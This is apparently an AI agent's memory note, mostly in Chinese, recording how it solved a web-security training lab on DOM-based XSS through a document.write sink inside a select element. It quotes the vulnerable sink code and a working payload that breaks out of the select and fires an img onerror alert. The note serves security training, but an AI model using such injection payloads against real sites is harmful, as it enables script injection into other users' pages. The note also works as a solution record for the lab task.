---
metadata:
  node_type: memory
name: "PRS arm A lab-document-write-sink-inside-select-element"
description: "arm A 基线:lab-document-write-sink-inside-select-element 冷实例一次通过 - storeId 注入 </select><img src=1 onerror=alert(1)> 破 select,page_alert fired + banner solved"
last_updated: 2026-10-09T00:57:21+08:00
created: 2026-10-09T00:57:21+08:00
---

## 2026-10-09 arm A 基线 (solved)

题: lab-document-write-sink-inside-select-element(DOM XSS, document.write 汇点 + location.search 源, 数据落在 `<select>` 内)。冷实例 reused:false, 无 exploit server(exploit_server:null), 一次通过。

解法链:
1. range_launch launch-url `/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element` --jar /tmp/cj1.json → 实例 URL(免 page_read 取号, resolved_from_page:true)。
2. 首页取商品链 → http_dump `/product?productId=1` --out(scripts 保留;http_session 会剥 script 块, 读汇点须用 http_dump)。
3. 汇点原文: `var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('<select name="storeId">'); ... document.write('<option selected>'+store+'</option>');`。payload 落在 `<option selected>` 内、外层是 select。
4. 破围: `?productId=1&storeId=%3C%2Fselect%3E%3Cimg%20src%3D1%20onerror%3Dalert(1)%3E` → `</select><img src=1 onerror=alert(1)>`。
5. page_alert 该 URL → alerts:["alert:1"], fired:true;再 banner_verdict 首页 → solved:true + "Congratulations, you solved the lab!"。

要点: 本题无交付面(反射型 DOM XSS),alert 一 fired 横幅即翻;URLSearchParams 会解码 %xx, 故百分号编码载荷可原样进 sink;`</select>` 是唯一必需的分隔符。

